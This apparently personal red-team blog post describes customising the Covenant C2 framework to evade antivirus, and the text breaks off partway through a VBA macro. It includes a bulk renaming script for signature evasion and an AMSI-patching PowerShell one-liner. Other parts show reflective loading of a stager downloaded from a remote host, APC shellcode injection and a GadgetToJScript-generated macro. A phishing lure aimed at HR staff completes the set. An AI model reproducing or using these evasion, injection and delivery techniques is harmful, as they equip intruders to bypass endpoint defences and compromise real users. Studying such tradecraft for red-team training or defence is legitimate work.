---
title: "Customized C2C for AV evasion " 
layout: "post"
---

In the last few weeks, i have had the opportunity to experience using the __C2-Framework__ __Covenant__ during the Red Team Operator course by __Rastamouse__. 
It is an open-source framework that enables developers to create their own __AV-Evasion__ and __C2-Customization__ projects.



### 1) Entering the Covenant C2C use case 

Whenever we download an offensive tool from the Internet, it comes as no surprise when it gets snapped up by an anti-virus solution. 
AV vendors are certainly keeping a keen eye on tools posted publicly (insert conspiracy theory about Microsoft owning GitHub) and are reacting relatively quickly to push signatures for those tools. 

However, it’s probably fair to say that these signatures are not particularly robust, and only really serve to catch those that don’t have the skills or knowledge to make the necesary modifications.
This holds true for __Covenant’s__ Windows __implant__ - Grunts. Therefore, we will try to alter the Covenant default installation. 

After cloning the main repository of Covenant, we will modify some of its default words(Grunt, Jitter, Stage0, etc) to improve AV signature scanning capabilities.
The bash script to automate this process is presented below:

```sh
sudo git clone --recurse-submodules https://github.com/ZeroPointSecurity/Covenant.git /home/kali/Desktop/red/Covenant

cd /home/kali/Desktop/red/Covenant/Covenant

mv ./Data/AssemblyReferences/ ../AssemblyReferences/
mv ./Data/ReferenceSourceLibraries/ ../ReferenceSourceLibraries/
mv ./Data/EmbeddedResources/ ../EmbeddedResources/
mv ./Models/Covenant/ ./Models/LazyMonkey/
mv ./Components/CovenantUsers/ ./Components/LazyMonkUsers/
mv ./Components/Grunts/ ./Components/Monks/
mv ./Models/Grunts/ ./Models/Monks/
mv ./Data/Grunt/GruntBridge/ ./Data/Grunt/MonkBridge/
mv ./Data/Grunt/GruntHTTP/ ./Data/Grunt/MonkHTTP/
mv ./Data/Grunt/GruntSMB/ ./Data/Grunt/MonkSMB/
mv ./Components/GruntTaskings/ ./Components/MonkTaskings/
mv ./Components/GruntTasks/ ./Components/MonkTasks/
mv ./Data/Grunt/ ./Data/Monk/

find ./ -type f -print0 | xargs -0 sed -i "s/Grunt/Monk/g"
find ./ -type f -print0 | xargs -0 sed -i "s/GRUNT/MONK/g"
find ./ -type f -print0 | xargs -0 sed -i "s/grunt/monk/g"
#find ./ -type f -print0 | xargs -0 sed -i "s/covenant/lazymonk/g"
find ./ -type f -print0 | xargs -0 sed -i "s/Covenant/LazyMonk/g"
find ./ -type f -print0 | xargs -0 sed -i "s/COVENANT/LAZYMONK/g"
find ./ -type f -print0 | xargs -0 sed -i "s/ExecuteStager/ExcLev1/g"
#find ./ -type f -print0 | xargs -0 sed -i "s/REPLACE_PROFILE/REP_PROF/g"
#find ./ -type f -print0 | xargs -0 sed -i "s/REPLACE_PIPE/REP_PIP/g"
#find ./ -type f -print0 | xargs -0 sed -i "s/GUID/ANGID/g"
find ./ -type f -print0 | xargs -0 sed -i "s/SetupAES/ConfAES/g"
find ./ -type f -print0 | xargs -0 sed -i "s/SessionKey/Sekey/g"
find ./ -type f -print0 | xargs -0 sed -i "s/EncryptedChallenge/EncChall/g"
find ./ -type f -print0 | xargs -0 sed -i "s/DecryptedChallenges/decryptchall/g"
find ./ -type f -print0 | xargs -0 sed -i "s/Stage0Body/Body1/g"
find ./ -type f -print0 | xargs -0 sed -i "s/Stage0Response/Response1/g"
find ./ -type f -print0 | xargs -0 sed -i "s/Stage0Bytes/Bytes1/g"
find ./ -type f -print0 | xargs -0 sed -i "s/Stage1Body/Body2/g"
find ./ -type f -print0 | xargs -0 sed -i "s/Stage1Response/Response2/g"
find ./ -type f -print0 | xargs -0 sed -i "s/Stage1Bytes/Bytes2/g"
find ./ -type f -print0 | xargs -0 sed -i "s/Stage2Body/Body3/g"
find ./ -type f -print0 | xargs -0 sed -i "s/Stage2Response/Response3/g"
find ./ -type f -print0 | xargs -0 sed -i "s/Stage2Bytes/Bytes3/g"
find ./ -type f -print0 | xargs -0 sed -i "s/message64str/mesage64str/g"
find ./ -type f -print0 | xargs -0 sed -i "s/messageBytes/messAgEbytes/g"
find ./ -type f -print0 | xargs -0 sed -i "s/totalReadBytes/rebytes/g"
#find ./ -type f -print0 | xargs -0 sed -i "s/inputStream/instr/g"
#find ./ -type f -print0 | xargs -0 sed -i "s/outputStream/outstr/g"
find ./ -type f -print0 | xargs -0 sed -i "s/deflateStream/deflatestream/g"
find ./ -type f -print0 | xargs -0 sed -i "s/memoryStream/memorystream/g"
find ./ -type f -print0 | xargs -0 sed -i "s/compressedBytes/packdbyt/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/REPLACE_/REP_/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/_PROFILE_/_PROF_/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/_VALIDATE_/_VAL_/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/GUID/USERID/g"
find ./ -type f -name "*.razor" -print0 | xargs -0 sed -i "s/GUID/USERID/g"
find ./ -type f -name "*.json" -print0 | xargs -0 sed -i "s/GUID/USERID/g"
find ./ -type f -name "*.yaml" -print0 | xargs -0 sed -i "s/GUID/USERID/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/guid/userid/g"
find ./ -type f -name "*.razor" -print0 | xargs -0 sed -i "s/guid/userid/g"
find ./ -type f -name "*.json" -print0 | xargs -0 sed -i "s/guid/userid/g"
find ./ -type f -name "*.yaml" -print0 | xargs -0 sed -i "s/guid/userid/g"
find ./ -type f -print0 | xargs -0 sed -i "s/ProfileHttp/prohttp/g"
find ./ -type f -print0 | xargs -0 sed -i "s/baseMessenger/bAsemEsSenger/g"

find ./ -type f -print0 | xargs -0 sed -i "s/PartiallyDecrypted/pdecry/g"
find ./ -type f -print0 | xargs -0 sed -i "s/FullyDecrypted/fuldecry/g"
find ./ -type f -print0 | xargs -0 sed -i "s/compressedBytes/packedbytes/g"

find ./ -type f -print0 | xargs -0 sed -i "s/CookieWebClient/MonksWebClient/g"
#find ./ -type f -print0 | xargs -0 sed -i "s/CookieContainer/KekseContains/g"
#find ./ -type f -print0 | xargs -0 sed -i "s/GetWebRequest/webreq/g"
find ./ -type f -print0 | xargs -0 sed -i "s/Jitter/JItter/g"
find ./ -type f -print0 | xargs -0 sed -i "s/ConnectAttempts/tentativeconn/g"
find ./ -type f -print0 | xargs -0 sed -i "s/RegisterBody/RegBody/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/messenger/messaggio/g"
find ./ -type f -print0 | xargs -0 sed -i "s/Hello World/Its me, Mario/g"
find ./ -type f -print0 | xargs -0 sed -i "s/ValidateCert/valCer/g"
find ./ -type f -print0 | xargs -0 sed -i "s/UseCertPinning/certpin/g"
find ./ -type f -print0 | xargs -0 sed -i "s/EncryptedMessage/encmsg/g"
find ./ -type f -print0 | xargs -0 sed -i "s/cookieWebClient/monkwebclient/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/aes/cryva/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/aes2/cryva2/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/array5/ar5/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/array6/ar6/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/array4/ar4/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/array7/ar7/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/array1/ar1/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/array2/ar2/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/array3/ar3/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/list1/l1/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/list2/l2/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/list3/l3/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/list4/l4/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/list5/l5/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/group0/g0/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/group1/g1/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/group2/g2/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/group3/g3/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/group4/g4/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/group5/g5/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/group6/g6/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/group7/g7/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/group8/g8/g"



find ./ -type f -name "*Grunt*" | while read FILE ; do
	newfile="$(echo ${FILE} |sed -e "s/Grunt/Monk/g")";
	mv "${FILE}" "${newfile}";
done
find ./ -type f -name "*GRUNT*" | while read FILE ; do
	newfile="$(echo ${FILE} |sed -e "s/GRUNT/MONK/g")";
	mv "${FILE}" "${newfile}";
done

find ./ -type f -name "*grunt*" | while read FILE ; do
	newfile="$(echo ${FILE} |sed -e "s/grunt/monk/g")";
	mv "${FILE}" "${newfile}";
done

find ./ -type f -name "*Covenant*" | while read FILE ; do
	newfile="$(echo ${FILE} |sed -e "s/Covenant/LazyMonk/g")";
	mv "${FILE}" "${newfile}";
done

find ./ -type f -name "*COVENANT*" | while read FILE ; do
	newfile="$(echo ${FILE} |sed -e "s/COVENANT/LAZYMONK/g")";
	mv "${FILE}" "${newfile}";
done

#find ./ -type f -name "*covenant*" | while read FILE ; do
#	newfile="$(echo ${FILE} |sed -e "s/covenant/monkcommand/g")";
#	mv "${FILE}" "${newfile}";
#done

mv ../AssemblyReferences/ ./Data/ 
mv ../ReferenceSourceLibraries/ ./Data/ 
mv ../EmbeddedResources/ ./Data/ 

dotnet build
dotnet run

```

__Note:__ Please modify the script accordingly with your needs 🚩

 
The new __Covenant__ instance will generate the default Grunt using the __Monk__ word. Is up to the user to change the default __Covenant__ Listener Profile. 

There might be more than one way to accomplish this string concatenation; another way is proposed below: 
```cpp
Just another way to declare modified strings 
{""GUID"":""{0}"",""Type"":{1},""Meta"":""{2}"",""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}";'
{""---G-U-I-----D"":""{0}"",""T----y-p-----e"":{1},""---M-e-t----a"":""{2}"",""---I---V---"":""{3}"",""---E--n---cry---pt-e-d-M-e---ss---a-g-e"":""{4}"",""---H-----M--A--C"":""{5}""}".Replace("-","");'
```



### 2) Covenant Custom C2C Profile 


__Covenant__ does provide various means of changing the default Grunt behaviour, which can be leveraged in such a way as to remove the indicators that a particular security product is finding.
This post will look at Traffic Profiles and Grunt Templates.

Instead of making modifications willy-nilly, we need to know (with a reasonable degree of accuracy) which part(s) of the __Grunt__ __Stager__ get detected. 
For that I use __ThreatCheck__, which will split a sample into multiple chunks and submit them either to AMSI or Defender’s MpCmdRun utility.

From a default __Covenant__ installation we can generate a standard binary Grunt then examine the file with ThreatCheck. Executing ThreatCheck will highlight the following malicious bytes:

<p align="center">
  <img src="/assets/posts/2021-07-01-Entering-the-Covenant-C2C/cov1.JPG">
</p>

__ThreatCheck__ dumps a `256-byte` hex view up from the end of the offending bytes, so the “interesting” bytes are always at the bottom. 
In any case, we see here the connect address for the listener, followed by the base64 encoded string `VXNlci1BZ2VudA==` with is `User-Agent`.

These request headers are part of the default traffic profile used by the default listener. 
However if we go into the profile editor, we’re free to add, remove, change these as we see fit. An example follow below:


<p align="center">
  <img src="/assets/posts/2021-07-01-Entering-the-Covenant-C2C/cov2.JPG">
</p>

- Inserted an additional header at the top so that the base64 encoded string for `User-Agent` was not appearing directly after the connect URL.

- Modified `User-Agent` string


Now when we regenerate the __Binary__ __Launcher__ and scan it with __ThreatCheck__, that particular detection is gone, but we get another one. 
__ThreatCheck__ will only show one detection at a time, so this is certainly an iterative process. 
You obviously need to reiterate this process few times in order to find  all the malicious bytes the flag the Defender's signature.  




### 3) Grunt DLL with rundll32 - AvBypass

Some people might have different opinions, but a well crafted payload can be dropped on disk safely in certain situations. 
For this reason we now going to convert the grunt binary stage to a custom DLL that can be executed on the target machine or it could be used for __lateral__ __movement__ at different stage. 
File write operations are so common that it's extremely hard for security products to alert just on that.

From __Covenant__ we can create a __Grunt__ DLL that has an export compatible with __rundll32__.

- In __Covenant__, select the Binary Launcher and Generate a new __Grunt__. Then click the Code tab and copy the __StagerCode__.

- Open __Visual__ __Studio__ and create a new __Class__ __Library__ __(.NET__ __Framework)__ project. Delete everything in Class1.cs and paste the __StagerCode__.

- Go to Project > Manage NuGet Packages. Click browse and search for __UnmanagedExports__. Install the package by Robert Giesecke.

- Collapse the __GruntStager__ class and add the following Export class underneath.

```cpp
public class Exports
{
    [DllExport("MonkEntry", CallingConvention = CallingConvention.Cdecl)]
    public static void MonkEntry(IntPtr hwnd,
    IntPtr hinst,
    string lpszCmdLine,
    int nCmdShow)
    {
        new MonkStager.MonkStager();
    }
}

```

- Add using statements for __System.Runtime.InteropServices__ and __RGiesecke.DllExport__. 

- Open the __Configuration__ __Manager__ and create a `"New Solution Platform for x64"` (and x86 if you require).

Now build the project and copy the DLL to the target machine. We can now execute the DLL with __rundll32__ taking advantage of the exports funcion. 

```sh
rundll32 covenant-DLL-noAmsi.dll,MonkEntry
```

If everything goes fine now you should have your __Grunt__ checking in on __Covenant__.

<p align="center">
  <img src="/assets/posts/2021-07-01-Entering-the-Covenant-C2C/cov3.JPG">
</p> 


__Note:__ Windows Defender real time protection is enabled 🚩


Once the modified C# Monkstager has been downloaded and imported into Visual Studio it is possible to add further obfuscation using the following tool from IBM XForce-Red

- [InvisibilityCloak:](https://github.com/xforcered/InvisibilityCloak) Obfuscation toolkit for C# post-exploitation tools that perform basics actions for a C# visual studio project.

Alternatively, on the final __.exe__ payload is possible to apply futher string obfuscation using the following tool:


- [NET-Obfuscate:](https://github.com/BinaryScary/NET-Obfuscate) Obfuscate ECMA CIL (.NET IL) assemblies to evade Windows Defender

Since our project, both for the DLL and for the EXE are stored and managed in Visual Studio we could also take advantages of [ConfuserEx](https://github.com/mkaring/ConfuserEx) than can also be installed from the Visual Studio marketplace. 


We can go an extra mile here and we can perform some .NET reflection to execute or __Grunt__ stager. Altought not very realistic at this stage we can use this approach at different stage of our engagement. 



__Note:__ The most basic (although not very interesting) method of loading and running this code, is from disk using PowerShell🚩:


```powershell

# Patch Amsi
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

PS > [System.Reflection.Assembly]::LoadFile("C:\Users\IEUser\Desktop\covenant-DLL-noAmsi.dll")
PS > [MonkStager.MonkStager]::Execute()

```

<p align="center">
  <img src="/assets/posts/2021-07-01-Entering-the-Covenant-C2C/cov5.JPG">
</p>

And note your new powershell __Grunt__ checking in on __Covenant__.



<p align="center">
  <img src="/assets/posts/2021-07-01-Entering-the-Covenant-C2C/cov4.JPG">
</p>





On the other hand we can keep our stager entirely in memory by downloading the DLL reflectively from a remote location as follow below:

```powershell 
# Patch Amsi
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

PS > $dll = (new-object net.webclient).DownloadData("http://192.168.152.100:1234/monk-Avbypass.dll)
PS > [System.Reflection.Assembly]::Load($dll)
PS > [MonkStager.MonkStager]::Execute()
```

The usage of DLL execution can be particulary useful when dealing with __AppLocker__ bypass as it is common occurrence that the DLL __AppLocker__ rules are not enabled or enforced 🚩. 
However we are not going to dig further around this topic, or at least not for now. 

### 4) Initial delivery 

We can try to simulate a campaign conducted by foreign APT adversaries. We will try to leverage the amazing [GadgetToJScript:](https://github.com/med0x2e/GadgetToJScript) project to weaponize our custom .NET assembly.
Our DLL is not perfect, but it works. However, it's quite hard to deliver one to a target user since no default actions are associated with that file type (double clicking it doesn't do much!). 
Not to mention that most corporate web proxies and mail filters block the DLL file type regardless of being malicious or benign! 
What is needed is an additional component that will write our DLL on disk and then load it to trigger the execution. 
HTA format can be used to facilitate this scenario, but the same concept could be applied with other languages such as VBS and VBA, commonly used for initial enterprise access. This is still the first attack vector used by APT to attack enterprise considering the wide deployment of the Windows office suite.
For this reason we will implement a malicious office with macro enabled. For this simulation we are going to use a simple MessageBox as our payload.

For our basic scenario we will implement the following:

- Generate a non encrypted shellcode with msfvenom 

- Store shellcode inside our payload that will perform APC (Asynchronous Procedure Calls) queue code injection

- Convert our payload to a compatible vba/vbs file 

- Execute the payload leveraging "Enable Macro" from office



Without esitation let's dig into the scenario and let's start by generating a simple non encrypted __msfvenom__ __shellcode__: 

```powershell
msfvenom -a x64 -p windows/x64/messagebox Text="Hello from shellcode"  -f csharp
```

Moving forward we now need  to store our shellcode into a payload that when executed it will carry out shellcode injection into specific process. 

I decided to use the [QueueUserAPC injection using D/invoke](https://gist.github.com/jfmaes/944991c40fb34625cf72fd33df1682c0) for the process injection part.

This will essentially perform the following: 

- Write a C++ program DInjectQueuerAPC.exe that will:
- Find explorer.exe process ID
- Allocate memory in explorer.exe process memory space
- Write shellcode to that memory location
- Find all threads in explorer.exe
- Queue an APC to all those threads. APC points to the shellcode
- Execute the above program


 
Create a default console application in Visual Studio, delete the code and past the code from the gist path. 
Bear in mind you need to import __D\Invoke__ __package__ from [The Wower](https://twitter.com/therealwover?lang=en). Paste the shellcode from __msfvenom__ and declare
the path of the process which will be used for process injection. In our case we are going to inject into __notepad.exe__

 <p align="center">
  <img src="/assets/posts/2021-07-01-Entering-the-Covenant-C2C/cov14.JPG">
</p>


Now that we have our malicious __.exe__ file we can move on and leverage the __GadgetToJScript__ project. 

First of all we need to build __GadgetToJScript__ in __VisualStudio__. Once the __GadgetToJScript__ binary has been build we can launch the program to generate a malicious __.js__ file that will spawn our custom __Covenant__ __Grunt__.

The code is illustrate below: 

<p align="center">
  <img src="/assets/posts/2021-07-01-Entering-the-Covenant-C2C/cov6.JPG">
</p>

The parameters are as follow: 

- `a = .NET Assembly`
- `w = Script type js, vbs, vba or hta`
- `e = Encode type`
- `o = output file`
- `b = Bypass type check controls`
- `r = registration-free activation of .NET based COM`
                               

Once we have generated our malicious __.js__ file we can execute the file using the __Windows__ __Script__ __Host__ __(WSH)__ engine leveraging __cscript__ or __wscript__ as follow:

<p align="center">
  <img src="/assets/posts/2021-07-01-Entering-the-Covenant-C2C/cov7.JPG">
</p>

If everything went file you should now have your new cscript __Grunt__ checking in on __Covenant__.

<p align="center">
  <img src="/assets/posts/2021-07-01-Entering-the-Covenant-C2C/cov8.JPG">
</p>
 
__Note:__ Please note that we can also generate our malicious vba script to be stored inside an office macro enable document as follow below 🚩

<p align="center">
  <img src="/assets/posts/2021-07-01-Entering-the-Covenant-C2C/cov9.JPG">
</p>


This will generate the following VBA code: 

```vba
Function b64Decode(ByVal enc)
    Dim xmlObj, nodeObj
    Set xmlObj = CreateObject("Msxml2.DOMDocument.3.0")
    Set nodeObj = xmlObj.CreateElement("base64")
    nodeObj.dataType = "bin.base64"
    nodeObj.Text = enc
    b64Decode = nodeObj.nodeTypedValue
    Set nodeObj = Nothing
    Set xmlObj = Nothing
End Function

Function Exec()
    
	Dim stage_1, stage_2

    stage_1 = "AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVy"
stage_1 = stage_1 & "ZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0"
stage_1 = stage_1 & "LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAxxA8UmVz"
stage_1 = stage_1 & "b3VyY2VEaWN0aW9uYXJ5DQogICAgICAgICAgICB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2"
stage_1 = stage_1 & "cmFtZXRlcnM+DQogICAgICAgICAgICAgICAgICAgICAgICA8czpTdHJpbmc+bWljcm9zb2Z0OldvcmtmbG93Q29tcG9uZW50TW9k"
stage_1 = stage_1 & "ZWw6RGlzYWJsZUFjdGl2aXR5U3Vycm9nYXRlU2VsZWN0b3JUeXBlQ2hlY2s8L3M6U3RyaW5nPg0KICAgICAgICAgICAgICAgICAg"
stage_1 = stage_1 & "ICAgICAgPHM6U3RyaW5nPnRydWU8L3M6U3RyaW5nPg0KICAgICAgICAgICAgICAgICAgICA8L09iamVjdERhdGFQcm92aWRlci5N"
stage_1 = stage_1 & "ZXRob2RQYXJhbWV0ZXJzPg0KICAgICAgICAgICAgICAgIDwvT2JqZWN0RGF0YVByb3ZpZGVyPg0KICAgICAgICAgICAgPC9SZXNv"
stage_1 = stage_1 & "dXJjZURpY3Rpb25hcnk+Cw=="

    
stage_2 = "AAEAAAD/////AQAAAAAAAAAMAgAAAFdTeXN0ZW0uV2luZG93cy5Gb3JtcywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRy"
stage_2 = stage_2 & "YWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAACFTeXN0ZW0uV2luZG93cy5Gb3Jtcy5BeEhvc3QrU3RhdGUB"
stage_2 = stage_2 & "AAAAEVByb3BlcnR5QmFnQmluYXJ5BwICAAAACQMAAAAPAwAAAMd7AAACAAEAAAD/////AQAAAAAAAAAEAQAAAH9TeXN0ZW0uQ29s"
stage_2 = stage_2 & "bGVjdGlvbnMuR2VuZXJpYy5MaXN0YDFbW1N5c3RlbS5PYmplY3QsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9"
stage_2 = stage_2 & "bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dAwAAAAZfaXRlbXMFX3NpemUIX3ZlcnNpb24FAAAICAkC"
stage_2 = stage_2 & "AAAACgAAAAoAAAAQAgAAABAAAAAJAwAAAAkEAAAACQUAAAAJBgAAAAkHAAAACQgAAAAJCQAAAAkKAAAACQsAAAAJDAAAAA0GBwMA"
stage_2 = stage_2 & "dWlkCwAAAAJfYQJfYgJfYwJfZAJfZQJfZgJfZwJfaAJfaQJfagJfawAAAAAAAAAAAAAACAcHAgICAgICAgITE9J07irREYv7AKDJ"
stage_2 = stage_2 & "Dyb3Cws="


    Dim stm_1 As Object, fmt_1 As Object
    
    manifest = "<?xml version=""1.0"" encoding=""UTF-16"" standalone=""yes""?>"
	manifest = manifest & "<assembly xmlns=""urn:schemas-microsoft-com:asm.v1"" manifestVersion=""1.0"">"
	manifest = manifest & "<assemblyIdentity name=""mscorlib"" version=""4.0.0.0"" publicKeyToken=""B77A5C561934E089"" />"
	manifest = manifest & "<clrClass clsid=""{D0CBA7AF-93F5-378A-BB11-2A5D9AA9C4D7}"" progid=""System.Runtime.Serialization"
	manifest = manifest & ".Formatters.Binary.BinaryFormatter"" threadingModel=""Both"" name=""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"" "
	manifest = manifest & "runtimeVersion=""v4.0.30319"" /><clrClass clsid=""{8D907846-455E-39A7-BD31-BC9F81468B47}"" "
	manifest = manifest & "progid=""System.IO.MemoryStream"" threadingModel=""Both"" name=""System.IO.MemoryStream"" runtimeVersion=""v4.0.30319"" /></assembly>"


    Set actCtx = CreateObject("Microsoft.Windows.ActCtx")
    actCtx.ManifestText = manifest
        
    Set stm_1 = actCtx.CreateObject("System.IO.MemoryStream")
    Set fmt_1 = actCtx.CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")

    Dim Decstage_1
    Decstage_1 = b64Decode(stage_1)

    For Each i In Decstage_1
        stm_1.WriteByte i
    Next i

    On Error Resume Next

    stm_1.Position = 0
    Dim o1 As Object
    Set o1 = fmt_1.Deserialize_2(stm_1)

    If Err.Number <> 0 Then
       Dim stm_2 As Object
       
       Set stm_2 = actCtx.CreateObject("System.IO.MemoryStream")

       Dim Decstage_2
       Decstage_2 = b64Decode(stage_2)

       For Each j In Decstage_2
        stm_2.WriteByte j
       Next j

       stm_2.Position = 0
       Dim o2 As Object
       Set o2 = fmt_1.Deserialize_2(stm_2)
    End If

End Function
```

Furthermore, we can now craft our dedicated word/excel document to be used during our simulated phishing campaign. Bear in mind the this is a huge part as a Red Team Operator
considering the user's training and the security monitoring deployed across the perimeter of the enterprise network. Sometimes, HR office can be a good candidate for 
phishing document since they need to open and access possible employeer curriculum. In the following scenario we will present a custom word with a "fake" encryption aplied to the document.
Leveraging GDPR principles we will try to encrypt our document and force the HR individual to click to "Enable content" button.   

Below the custom word document that we will deliver to the HR office as part of our phishing campaing

<p align="center">
  <img src="/assets/posts/2021-07-01-Entering-the-Covenant-C2C/cov10.JPG">
</p>

We will now go on and add our malicious macro. We can access the Macro menu by navigating to the View tab and selecting Macros.
From the Macros dialog window, we must choose the current document from the drop down menu. 
Verify this to ensure that the VBA code is only embedded in this document, otherwise the VBA code will be saved to our global template.


<p align="center">
  <img src="/assets/posts/2021-07-01-Entering-the-Covenant-C2C/cov11.JPG">
</p>

After selecting the current document, we’ll enter a name for the macro. In this example, we’ll 
name the macro “Exec” and then select Create. This will launch the VBA editor where we can run and debug the code. 
Now copy inside the VBA editor the following adapted VBA code:

```vba
Function b64Decode(ByVal enc)
    Dim xmlObj, nodeObj
    Set xmlObj = CreateObject("Msxml2.DOMDocument.3.0")
    Set nodeObj = xmlObj.CreateElement("base64")
    nodeObj.dataType = "bin.base64"
    nodeObj.Text = enc
    b64Decode = nodeObj.nodeTypedValue
    Set nodeObj = Nothing
    Set xmlObj = Nothing
End Function

Function Exec()
    
	Dim stage_1, stage_2

stage_1 = "AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVy"
stage_1 = stage_1 & "ZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0"
stage_1 = stage_1 & "LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAxxA8UmVz"
stage_1 = stage_1 & "b3VyY2VEaWN0aW9uYXJ5DQogICAgICAgICAgICB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2"
stage_1 = stage_1 & "aW5nc30iIE1ldGhvZE5hbWUgPSJTZXQiPg0KICAgICAgICAgICAgICAgICAgICA8T2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBh"
stage_1 = stage_1 & "cmFtZXRlcnM+DQogICAgICAgICAgICAgICAgICAgICAgICA8czpTdHJpbmc+bWljcm9zb2Z0OldvcmtmbG93Q29tcG9uZW50TW9k"
stage_1 = stage_1 & "ZWw6RGlzYWJsZUFjdGl2aXR5U3Vycm9nYXRlU2VsZWN0b3JUeXBlQ2hlY2s8L3M6U3RyaW5nPg0KICAgICAgICAgICAgICAgICAg"
stage_1 = stage_1 & "ICAgICAgPHM6U3RyaW5nPnRydWU8L3M6U3RyaW5nPg0KICAgICAgICAgICAgICAgICAgICA8L09iamVjdERhdGFQcm92aWRlci5N"
stage_1 = stage_1 & "ZXRob2RQYXJhbWV0ZXJzPg0KICAgICAgICAgICAgICAgIDwvT2JqZWN0RGF0YVByb3ZpZGVyPg0KICAgICAgICAgICAgPC9SZXNv"
stage_1 = stage_1 & "dXJjZURpY3Rpb25hcnk+Cw=="

    
stage_2 = "AAEAAAD/////AQAAAAAAAAAMAgAAAFdTeXN0ZW0uV2luZG93cy5Gb3JtcywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRy"
stage_2 = stage_2 & "YWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAACFTeXN0ZW0uV2luZG93cy5Gb3Jtcy5BeEhvc3QrU3RhdGUB"
stage_2 = stage_2 & "AAAAEVByb3BlcnR5QmFnQmluYXJ5BwICAAAACQMAAAAPAwAAAMd7AAACAAEAAAD/////AQAAAAAAAAAEAQAAAH9TeXN0ZW0uQ29s"
stage_2 = stage_2 & "bGVjdGlvbnMuR2VuZXJpYy5MaXN0YDFbW1N5c3RlbS5PYmplY3QsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9"
stage_2 = stage_2 & "bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dAwAAAAZfaXRlbXMFX3NpemUIX3ZlcnNpb24FAAAICAkC"
stage_2 = stage_2 & "ZSkGfwAAAClTeXN0ZW0uT2JqZWN0IENyZWF0ZUluc3RhbmNlKFN5c3RlbS5UeXBlKQgAAAAKAU4AAAAPAAAABoAAAAAmU3lzdGVt"
